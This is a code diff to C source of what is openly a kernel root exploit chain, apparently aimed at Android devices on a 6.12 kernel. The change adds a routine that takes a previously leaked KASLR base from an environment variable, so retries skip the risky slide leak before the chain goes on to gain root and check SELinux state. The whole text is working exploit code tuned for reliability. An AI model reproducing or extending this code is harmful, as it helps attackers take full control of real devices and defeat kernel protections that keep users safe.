@@ -830,6 +830,40 @@ static int install_direct_root_payload(void) {
   return root_child_done;
 }
 
+/*
+ * The KASLR base is stable for the lifetime of a boot.  The app remembers a
+ * verified base from the first process and supplies it to later retries, but
+ * 6.12 historically ignored that environment value and repeated the slide
+ * race in every child.  That wastes the one risky stage and can turn a normal
+ * route miss into another slide panic.  Accept only a complete hexadecimal
+ * value in the expected kernel address range; an absent/invalid value keeps
+ * the original slide path for the first process.
+ */
+static int load_supplied_kaslr_base(void) {
+  const char *raw = getenv("KASLR_BASE");
+  if (!raw || !*raw) {
+    return 0;
+  }
+
+  errno = 0;
+  char *end = NULL;
+  uint64_t base = strtoull(raw, &end, 0);
+  if (errno != 0 || end == raw || *end != '\0' ||
+      base < KIMAGE_TEXT_BASE || !is_kernel_ptr((uintptr_t)base)) {
+    pr_warning("ignoring invalid supplied KASLR base=%s\n", raw);
+    return 0;
+  }
+
+  kaslr_base = base;
+  kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+  kaslr_done = 1;
+  pr_success("kaslr supplied pid=%d base=%016llx slide=%016llx "
+             "(slide route skipped)\n",
+             getpid(), (unsigned long long)kaslr_base,
+             (unsigned long long)kaslr_slide);
+  return 1;
+}
+
 /* Whole 6.12 chain, single attempt, in a pristine forked process. */
 static int run_exploit_once(void) {
   disable_rseq_for_thread();
@@ -839,15 +873,17 @@ static int run_exploit_once(void) {
   init_ashmem_path();
 
   pin_to_core(CORE);
-  if (!slide_leak_kernel_base()) {
-    pr_error("slide kaslr leak failed\n");
-    return 0;
-  }
+  if (!load_supplied_kaslr_base()) {
+    if (!slide_leak_kernel_base()) {
+      pr_error("slide kaslr leak failed\n");
+      return 0;
+    }
 
-  /* The KASLR slide temporarily leaves boot_id.data on nfulnl_logger. Once
-   * the text slide is known, restore permanent storage before starting the
-   * independent live-mm leak so any later failure remains globally safe. */
-  restore_bootid_data_required();
+    /* The KASLR slide temporarily leaves boot_id.data on nfulnl_logger. Once
+     * the text slide is known, restore permanent storage before starting the
+     * independent live-mm leak so any later failure remains globally safe. */
+    restore_bootid_data_required();
+  }
 
   root_uid_before = getuid();
   int selinux_state = read_selinux_enforcing();
